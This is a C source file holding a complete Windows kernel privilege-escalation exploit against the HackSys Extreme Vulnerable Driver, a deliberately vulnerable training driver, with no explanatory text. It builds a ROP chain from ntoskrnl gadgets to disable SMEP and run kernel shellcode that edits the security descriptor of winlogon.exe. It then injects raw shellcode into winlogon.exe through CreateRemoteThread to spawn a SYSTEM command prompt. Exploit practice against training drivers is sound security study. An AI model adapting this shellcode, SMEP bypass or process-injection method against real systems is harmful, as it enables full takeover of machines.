#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>

BYTE acl_editing[140] = {
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x82,
    0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x48, 0x8b, 0x9b, 0x48, 0x04,
    0x00, 0x00, 0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00, 0x48, 0xb9, 0x77,
    0x69, 0x6e, 0x6c, 0x6f, 0x67, 0x6f, 0x6e, 0x48, 0x39, 0x8b, 0xa8, 0x05,
    0x00, 0x00, 0x75, 0xdf, 0x48, 0x8b, 0x4b, 0xf8, 0x80, 0xe1, 0xf0, 0xc6,
    0x41, 0x48, 0x0b, 0x48, 0x8b, 0x88, 0xb8, 0x04, 0x00, 0x00, 0x80, 0xe1,
    0xf0, 0xc6, 0x81, 0xd4, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x8a, 0xe4,
    0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x8a, 0xe4, 0x01, 0x00,
    0x00, 0x48, 0x8b, 0x92, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58,
    0x01, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b,
    0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
    0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07
};

BYTE cmd[275] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
    0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
    0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
    0xbb, 0xaa, 0xc5, 0xe2, 0x5d, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
    0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00
};

DWORD FindProcessId(const wchar_t *processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);
    if (!wcscmp(processName, processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!wcscmp(processName, processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

typedef struct {
    ULONG_PTR objectID;
    ULONG_PTR objectType;
} UserObject;

int main() {
    LPVOID drivers[256];
    DWORD needed;

    EnumDeviceDrivers(drivers, 256, &needed);
    LPVOID ntoskrnl_base = drivers[0];

    LPVOID shellcode = VirtualAlloc(NULL, sizeof(acl_editing), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, acl_editing, sizeof(acl_editing));

    LPVOID pivot = VirtualAlloc((LPVOID) (0x48000000 - 0x1000), 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    VirtualLock(pivot, 0x10000);

    RtlFillMemory((LPVOID) 0x48000000, 0x28, 'A');
    ULONGLONG *rop = (ULONGLONG *) ((ULONGLONG) 0x48000000 + 0x28);

    *rop++ = (ULONGLONG) ntoskrnl_base + 0x2163ec; // pop rcx; ret;
    *rop++ = (ULONGLONG) 0x350ef8 ^ 1UL << 20;     // cr4 value
    *rop++ = (ULONGLONG) ntoskrnl_base + 0x3a06a7; // mov cr4, rcx; ret;
    *rop++ = (ULONGLONG) shellcode;                // acl editing

    UserObject payload = {
        0x4141414141414141,
        (ULONG_PTR)ntoskrnl_base + 0x2f0a30 // mov esp, 0x48000000; add esp, 0x28; ret;
    };

    HANDLE handle = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (handle == INVALID_HANDLE_VALUE) {
        puts("[-] Failed to get handle");
        exit(1);
    }

    DeviceIoControl(handle, 0x222023, &payload, sizeof(payload), NULL, 0, NULL, NULL);

    DWORD pid = FindProcessId(L"winlogon.exe");
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    LPVOID buffer = VirtualAllocEx(process, NULL, sizeof(cmd), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(process, buffer, cmd, sizeof(cmd), NULL);

    CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE) buffer, NULL, 0, NULL);
    CloseHandle(process);

    return 0;
}